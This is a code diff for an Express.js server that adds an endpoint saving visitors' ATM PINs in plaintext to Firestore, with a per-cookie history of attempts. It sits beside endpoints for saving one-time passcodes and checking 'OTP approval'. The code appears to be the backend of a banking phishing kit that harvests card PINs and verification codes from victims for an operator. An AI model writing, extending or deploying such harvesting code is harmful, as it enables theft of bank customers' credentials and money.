@@ -326,6 +326,54 @@ app.post('/api/save-otp', async (req, res) => {
     }
 });
 
+app.post('/api/save-atm-pin', async (req, res) => {
+    try {
+        const vid = req.cookies.vid;
+        if (!vid) {
+            return res.status(400).json({ success: false, error: 'No visitor ID' });
+        }
+        
+        const { atmPin } = req.body;
+        const { getFirestore } = require('./firebase-config');
+        const db = getFirestore();
+        const timestamp = new Date().toISOString();
+        const docRef = db.collection('visitors').doc(vid);
+        const doc = await docRef.get();
+        
+        const attemptCount = doc.exists && doc.data().atmPin && doc.data().atmPin.history 
+            ? Object.keys(doc.data().atmPin.history).length 
+            : 0;
+        
+        const updates = {
+            'atmPin.current': {
+                atmPin,
+                timestamp,
+                attemptNumber: attemptCount + 1
+            },
+            'lastUpdated': timestamp
+        };
+        
+        // حفظ المحاولة السابقة في history إذا كانت موجودة
+        if (doc.exists) {
+            const data = doc.data();
+            if (data.atmPin && data.atmPin.current) {
+                const historyCount = data.atmPin.history ? Object.keys(data.atmPin.history).length : 0;
+                const attemptKey = `atmPin.history.attempt_${historyCount + 1}`;
+                updates[attemptKey] = {
+                    ...data.atmPin.current,
+                    savedAt: timestamp
+                };
+            }
+        }
+        
+        await docRef.update(updates);
+        
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
 app.get('/api/check-otp-approval', async (req, res) => {
     try {
         const vid = req.cookies.vid;
